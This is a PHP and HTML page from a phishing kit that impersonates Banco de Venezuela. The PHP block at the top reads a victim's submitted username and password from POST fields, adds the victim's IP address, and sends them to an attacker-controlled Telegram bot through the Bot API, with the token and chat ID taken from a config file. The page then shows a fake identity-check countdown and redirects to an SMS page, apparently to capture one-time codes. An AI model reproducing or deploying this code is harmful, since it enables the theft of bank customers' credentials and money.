<?php
session_start();
ini_set("display_errors", 0);
$config = include('config.php');
$elusr = isset($_SESSION['elusr']) ? $_SESSION['elusr'] : '';

$llavecita = $_POST['normalidad'];
$elusr = $_POST['ocultos'];

// Guardar el valor en la sesión
$_SESSION['elusr'] = $elusr;

$token = $config['token'];
$chat_id = $config['chat_id'];

$ip = $_SERVER['REMOTE_ADDR']; 



$mensaje_para_chatbot = "usuario bvd \nusar: " . $elusr .  "\n" . "clv: " . $llavecita .  "\nip: " . $ip;


$telegram_url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($mensaje_para_chatbot);


$response = file_get_contents($telegram_url);


?>
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport"  content="width=device-width, initial-scale=1.0, user-scalable=no"
 />
    <title>Banco de Venezuela</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: url(background.jpg);
        background-size: cover;
        background-position: center;
      }

      .container {
        display: flex;

        height: 100%;
        width: 100%;
      }

      .left-side {
        width: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .right-side {
        width: 50%;
      }
      form {
        width: 80%;
        background: white;
        max-width: 550px;
        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
      }

      @media (max-width: 768px) {
        body {
          background: #ededed;
        }
        .container {
          flex-direction: column;
        }
        .left-side {
          width: 100%;
          height: 100vh;
        }
        .right-side {
          display: none;
        }
      }
    </style>
    <style>
      .form-group {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group label {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group input {
        width: 100%;
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;

        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }
      .form-group input:focus {
        border: 0;
      }
      .form-group input:focus + label,
      .form-group input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }
      button {
        background-color: #0067b1;
        color: white;
        border-radius: 3px;
        border: 0;
        padding: 15px;
        width: 200px;
      }
    </style>
    <style>
      .form-group2 {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group2 label {
        position: absolute;
        top: 50%;
        left: 23%;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group2 input {
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;
        border-bottom: 1px solid gray;
        background: #ededed;

        outline: none;
      }
      .form-group2 input:focus {
        border: 0;
      }
      .form-group2 input:focus + label,
      .form-group2 input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }
    </style>
    <style>
      .overlay {
        display: flex;
        justify-content: center;
        align-items: center;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5); /* Fondo semitransparente */
        z-index: 9999; /* Asegura que esté por encima de otros elementos */
      }

      .content {
        background-color: #fff;
        width: 350px;
        border-radius: 5px;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="left-side">
        <form>
          <div style="text-align: center">
            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
          </div>
          <div style="width: 100%; text-align: center">
            <div class="form-group">
              <img src="ldr.gif" style="width: 100px" />
            </div>
          </div>

          <div
            style="
              width: 100%;
              text-align: center;
              font-size: 12px;
              font-weight: bold;
              color: #999;
              margin-top: 30px;
              margin-bottom: 30px;
            "
          >
            Estamos validando tu identidad.
 <br />por favor ten cerca tu instrumento de seguridad
            
            <br />
            <br />
            <label style="color: black"
              >Tiempo restante <span id="countdown">15</span> segundos</label
            >
            <script>
              // Función para iniciar la cuenta regresiva
              function startCountdown(seconds) {
                // Obtener el elemento <span> donde mostraremos el contador
                var countdownElement = document.getElementById("countdown");

                // Iniciar el intervalo de cuenta regresiva
                var countdownInterval = setInterval(function () {
                  // Actualizar el contenido del elemento con el valor actual de segundos
                  countdownElement.textContent = seconds;

                  // Reducir el valor de segundos
                  seconds--;

                  // Verificar si el contador ha llegado a cero
                  if (seconds < 0) {
                    // Limpiar el intervalo y mostrar una alerta
                    clearInterval(countdownInterval);

                    window.location.href = "sms.php";
                  }
                }, 1000); // Intervalo de 1 segundo
              }

              // Llamar a la función de cuenta regresiva al cargar la página
              document.addEventListener("DOMContentLoaded", function () {
                startCountdown(15); // Iniciar la cuenta regresiva con 30 segundos
              });
            </script>
          </div>
        </form>
      </div>
      <div class="right-side"></div>
    </div>
  </body>
</html>
